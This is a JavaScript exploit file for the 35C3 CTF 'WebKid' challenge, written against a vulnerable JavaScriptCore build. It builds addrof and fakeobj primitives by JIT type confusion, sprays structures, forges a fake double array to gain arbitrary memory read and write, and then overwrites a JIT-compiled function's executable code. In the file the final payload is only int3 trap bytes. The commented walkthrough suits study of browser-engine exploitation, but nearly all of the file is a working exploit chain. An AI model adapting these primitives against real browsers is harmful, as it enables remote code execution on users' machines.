/* ------------------------------------------------------------------------ */
/* ------------------------------------------------------------------------ */

/*
 * 1. Construction of the addrof and fakeobj Primitives
 * ----------------------------------------------------
 *
 *    The vulnerability introduced by the 35c3ctf challenges' patch
 *    allows the modification of a JS object's structure without
 *    a transition.
 *
 *    Transitions are critical for JIT compiled code. Watchpoints
 *    are set by the engine on optimized code sections to know wether or
 *    not they are still relevant to the object they were optimized for.
 *    If an object used by a JIT compiled function changes, a transition
 *    occurs and the code is invalidated.
 *
 *    For this vulnerable build of JSC, that is not the case and it is
 *    possible to JIT compile functions and optimize them for an object
 *    using doubles (i.e. getting and setting a double value), then modify 
 *    this object and pass an object as argument, instead of a double.
 *    From getting and setting double values, two new primitives are created,
 *    namely addrof and fakeobj. These two primitives can be used to create
 *    a valid user controlled object in JSC's context. They will be used in
 *    the following steps to obtain code execution.
 *
 *    addrof: leaks the address of an arbitrary JavaScript object.
 *    fakeobj: injects a fake JavaScript Object into the engine.
 *
 */


print("[+] =========================================================");
print("[+] (ﾉ◕ヮ◕)ﾉ*:・ﾟ✧ 35C3CTF - WebKid Exploit (ﾉ◕ヮ◕)ﾉ*:・ﾟ✧");
print("[+] =========================================================");

print("[+]");
print("[+] Step 1: Constructing addrof and fakeobj primitives");
print("[+] --------------------------------------------------");

// Array of doubles used to train the JIT engine.
var primitives_hax = [4.2];

/*
 * Property added to the object which will be deleted later on to trigger
 * the vulnerability and be able to change the object as desired without
 * triggering a watchpoint.
 */
primitives_hax.a = 10;

// Function getting a value.
function get_first_elmt() {
    return primitives_hax[0];
}

// Function setting a value.
function set_first_elmt(elmt) {
    return primitives_hax[0] = elmt;
}

print("[+]\tJIT compilation of get_first_elmt and set_first_elmt.");
for (var i = 0; i < 100000; i++) {
    get_first_elmt();       // Function JIT compiled to get a double value.
    set_first_elmt(4.2);    // Function JIT compiled to set a double value. 
}

/* 
 * Apply a previous structure to primitives_hax without transition to
 * make sure the watchpoint is not triggered.
 * Now it is possible to change the object without invalidating the
 * JIT compiled code.
 */
delete primitives_hax.a;

/* 
 * addrof primitive based on get_first_elmt. Since get_first_elmt is
 * JIT compiled to be used with double values, now that it's possible to
 * change the object without invalidating it, an object can be passed to
 * it (instead of a double) to retrieve its address (instead of the
 * double value stored).
 */
function addrof(o) {
    primitives_hax[0] = o;
    return Int64.fromDouble(get_first_elmt());
}

/* 
 * fakeobj primitive based on set_first_elmt. Since set_first_elmt is
 * JIT compiled to be used with double values, now that it's possible to
 * change the object without invalidating it, an object can be passed to
 * it (instead of a double) to set an object's address in memory (instead
 * of storing a double value).
 */
function fakeobj(addr) {
    set_first_elmt(addr.asDouble());
    return primitives_hax[0];
}

print("[+]\taddrof and fakeobj constructed.");


/* ------------------------------------------------------------------------ */
/* ------------------------------------------------------------------------ */

/*
 * 2. Construction of Arbitrary Read and Write Primitives
 * ------------------------------------------------------
 *
 *    Using addrof and fakeobj, it is possible to obtain stronger primitives
 *    to read and write arbitrary locations in memory.
 *
 *    The idea is to first create a valid fake array (named hax) containing
 *    doubles in the engine's memory. Since hax is attacker-controlled, its
 *    butterfly can be set to an arbitrary address. In the case of this
 *    exploit, the butterfly will be set to point to another user-controlled
 *    array of doubles (named victim).
 *
 *    victim is created with a first property called pointer, storing a
 *    double, which will be located in its butterfly at the offset -0x10.
 *
 *    +--------------+      +--------------+      +-----------------------+
 *    | Array #1     | +--> | Array #2     |      | Original Butterfly    |
 *    | (hax)        | |    | (victim)     |      | (victim's butterfly)  |
 *    |              | |    |              |      |                       |
 *    | Structure ID | |    | Structure ID |      | ...                   |
 *    | Butterfly ---+-+    | Butterfly ---+-+    | property 0 -> pointer |
 *    +--------------+      +--------------+ |    | public len|vector len |
 *                                           +--->| array slot 0          |
 *                                                | ...                   |
 *                                                +-----------------------+
 *
 *
 *    victim's butterfly can be changed using hax. Therefore, by changing
 *    its butterfly to the address addr+0x10, it is possible to
 *    to write an arbitrary value at addr by modifying the value stored in
 *    victim.pointer. The same can be done to read a value, although it is
 *    limited since NaN value cannot be read using this technique (this
 *    limitation does not impact the exploit).
 *
 *
 *    +--------------+      +--------------+      +-----------------------+
 *    | Array #1     | +--> | Array #2     |      | Original Butterfly    |
 *    | (hax)        | |    | (victim)     |      | (victim's butterfly)  |
 *    |              | |    |              |      |                       |
 *    | Structure ID | |    | Structure ID |      | ...                   |
 *    | Butterfly ---+-+    | Butterfly ---+-+    | property 0 -> pointer |
 *    +--------------+      +--------------+ |    | public len|vector len |
 *                                           |    | array slot 0          |
 *                                           |    | ...                   |
 *                                           |    +-----------------------+
 *                                           |
 *                                           |    +-----------------------+
 *                                           |    | Fake Butterfly        |
 *                                           |    | (victim's butterfly)  |
 *                                           |    |                       |
 *                                           |    | ...                   |
 *                                           |    | addr -> "pointer"     |
 *                                           |    | addr + 0x8            |
 *                                           +--->| addr + 0x10           |
 *                                                | ...                   |
 *                                                +-----------------------+
 *
 *
 */


print("[+]");
print("[+] Step 2: Constructing arbitrary read and write primitives");
print("[+] --------------------------------------------------------");

print("[+]\tSpraying structures of double arrays to guess their ID.");
var structs = [];
for (var i = 0; i < 0x1000; ++i) {
    var array = [13.37];
    array.pointer = 1234;
    array['prop' + i] = 13.37;
    structs.push(array);
}

print("[+]\tCreating the fake double array: hax.");
/*
 * Our victim array is taken directly from the ones defined above in the
 * spraying loop. This is a way to ensure that the bytes preceeding the
 * array object in memory are not null. It is important because victim
 * will be treated as hax's butterfly later on, and those preceeding bytes
 * will represent its length, which is why they cannot be null.
 */
var victim = structs[0x800];


// jsCellHeader contains the header of our fake hax object.
var js_cell_header = new Int64([
    0x0, 0x10, 0x0, 0x0,    // m_structureID: current guess is set to 0x1000.
    0x7,                    /*
                             * m_indexingType: I don't know, it's taken from
                             * the header of a similar object and was found
                             * through debugging.
                             */
    0x20,                   // m_type: ArrayType (DerivedArrayType also works)
    0x08,                   // m_flags: None
    0x1                     // m_cellState: DefinitelyWhite
]);

/*
 * hax values are put inside a containing object, named container. The
 * properties header and butterfly are inlined in the object container.
 * Which is why we obtain the following layout in memory:
 *
 *  +-----------------------------------------------+
 *  | Container Object                              |
 *  |                                               |
 *  | 0x00: container's header                      |
 *  | 0x08: container's butterfly                   |
 *  | 0x10: property header -> hax's header         | <--- Where hax will
 *  | 0x18: property butterfly -> hax's butterfly   |      need to point.
 *  +-----------------------------------------------+
 *
 * The property "header" will be the header of our fake object hax.
 * The property "butterfly" will be the butterfly of our fake object hax
 * and will point to victim.
 *
 */
var container = {
    header: js_cell_header.asJSValue(),
    butterfly: victim
};

/*
 * To create the fake object hax, the address of container is needed
 * and retrieved using the primitive addrof.
 */
var container_addr = addrof(container);
print(`[+]\tObject "container" containing hax @ ${container_addr}`);


/*
 * Now hax will be created using fakeobj. It will point to the address
 * container+0x10 to align on its header property, containing jsCellHeader.
 */
var hax = fakeobj(Add(container_addr, 0x10));
var origButterfly = hax[1];
print(`[+]\tFake object hax @ ${addrof(hax)}`);

var memory = {
    /*
     * writeInt64 writes a quad-word at an arbitrary location.
     * This functions changes the butterfly of the object victim to addr+0x10
     * and then writes the value int64 to the property pointer, which results
     * in int64 being written to addr as a JSValue.
     */
    writeInt64(addr, int64) {
        hax[1] = Add(addr, 0x10).asDouble();
        victim.pointer = int64;
    },

    /*
     * readInt64 reads a quad-word from an arbitrary location.
     * This functions changes the butterfly of the object victim to addr+0x10
     * and then reads the address of the property pointer, which is actually
     * the quad-word stored at the address addr.
     * This primitive is limited though, it only works for bit patterns that
     * don't represent NaN values.
     */
    readInt64(addr) {
        hax[1] = Add(addr, 0x10).asDouble();
        return addrof(victim.pointer);
    },

    /*
     * Write a number of bytes to the given address `addr`.
     * Corrupts additional bytes after the end.
     */
    write(addr, data) {
        while (data.length % 8 != 0)
            data.push(0);

        var bytes = new Uint8Array(data);
        var doubles = new Float64Array(bytes.buffer);

        for (var i = 0; i < doubles.length; i++)
            this.writeInt64(Add(addr, 8 * i), doubles[i]);
    },

    // Tests of the primitives.
    test() {
        print("[+]\tArbitrary read and write tests:");

        var obj = {
            a: new Int64(0x0123456789abcdef).asDouble(),
            b: new Int64(0xfedcba9876543210).asDouble(),
        };
        print("[+]\t\tCreating obj.");

        var obj_addr = addrof(obj);
        var obj_a_addr = Add(obj_addr, 0x10);
        var obj_b_addr = Add(obj_addr, 0x18);
        print(`[+]\t\tobj.b @ ${obj_b_addr} = ${Int64.fromDouble(obj.b)}`);
        print(`[+]\t\tObject obj @ ${obj_addr}`);
        var obj_a_read = this.readInt64(obj_a_addr);
        print(`[+]\t\tobj.a @ ${obj_a_addr} = ${obj_a_read}`);
        var obj_b_read = this.readInt64(obj_b_addr);
        print(`[+]\t\tobj.b @ ${obj_b_addr} = ${obj_b_read}`);
        this.writeInt64(obj_b_addr, obj.a);
        print("[+]\t\tWriting obj.a into obj.b");
        print(`[+]\t\tobj.b @ ${obj_b_addr} = ${Int64.fromDouble(obj.b)}`);

        if (obj.a == obj.b) {
            print("[+]\t\tTests passed!");
        }
    }
};
print("[+]\tArbitrary read and write primitives created.");
memory.test();

/* ------------------------------------------------------------------------ */
/* ------------------------------------------------------------------------ */

/*
 * 3. Arbitrary Code Execution
 * ---------------------------
 *
 *    Code execution can be achieved using the RWX memory pages used for JIT
 *    compiled code.
 *    The code address of a JIT compiled function can be retrieved from its
 *    address. The interesting attributes are located at the following
 *    offsets.
 *
 *    JSC::JSFunction jit_compiled_func
 *     +-> JSC::ExecutableBase m_executable <+24>
 *       +-> JSC::FTL::JITCode m_jitCodeForCall <+24>
 *         +-> JSC::CodeRef<JSEntryPtrTag> m_b3Code <+368>
 *
 *    Once the address of `m_b3Code` is known, the JIT compiled code can be
 *    changed using the previously crafted write primitive.
 *    The original function is then executed with its newly changed code to
 *    execute attacker-controlled code.
 *
 */


print("[+]");
print("[+] Step 3: Arbitrary Code Execution");
print("[+] --------------------------------");

// JIT compiles and returns a function.
function get_jit_compiled_function() {
    function target(num) {
        num += 1.234;
        for (var i = 0; i < 200; i++)
            num /= 0.1;
        num = num % 3;
        return num;
    }

    for (var i = 0; i < 100000; i++) {
        target(10.42);
    }

    return target;
}

// JIT compiled function.
print("[+]\tJIT compiling jit_compiled_func");
// JIT compiled function.
var jit_compiled_func = get_jit_compiled_function();

// Address of the JIT compiled function.
var jit_compiled_func_addr = addrof(jit_compiled_func);
print(`[+]\tJSC::JSFunction jit_compiled_func @ ${jit_compiled_func_addr}`);

// Address of the attribute m_executable at *(jit_compiled_func_addr + 24).
var executable_addr = memory.readInt64(Add(jit_compiled_func_addr, 24));
print(`[+]\t\t+-> JSC::ExecutableBase m_executable @ ${executable_addr}`);

// Address of the attribute m_jitCodeForCall at *(m_executable + 24).
var jit_code_addr = memory.readInt64(Add(executable_addr, 24));
print(`[+]\t\t+-> JSC::FTL::JITCode m_jitCodeForCall @ ${jit_code_addr}`);

// Address of the attribute m_b3Code at *(m_jitCodeForCall + 368).
var b3code_addr = memory.readInt64(Add(jit_code_addr, 368));
print(`[+]\t\t+-> JSC::CodeRef<JSEntryPtrTag> m_b3Code @ ${b3code_addr}`);

// Writing `int 3` instructions in memory.
memory.write(b3code_addr, [0xcc, 0xcc, 0xcc]);
print("[+]\tModifying jit_compiled_func's code by `int 3` instructions.");

/*
 * Executing the hijacked JIT compiled function.
 * If everything goes as planned, JSC will SIGTRAP.
 */
print("[+]");
print("[+] JavaScriptCore should now SIGTRAP!");
print("[+]");
jit_compiled_func();

/* ------------------------------------------------------------------------ */
/* ------------------------------------------------------------------------ */
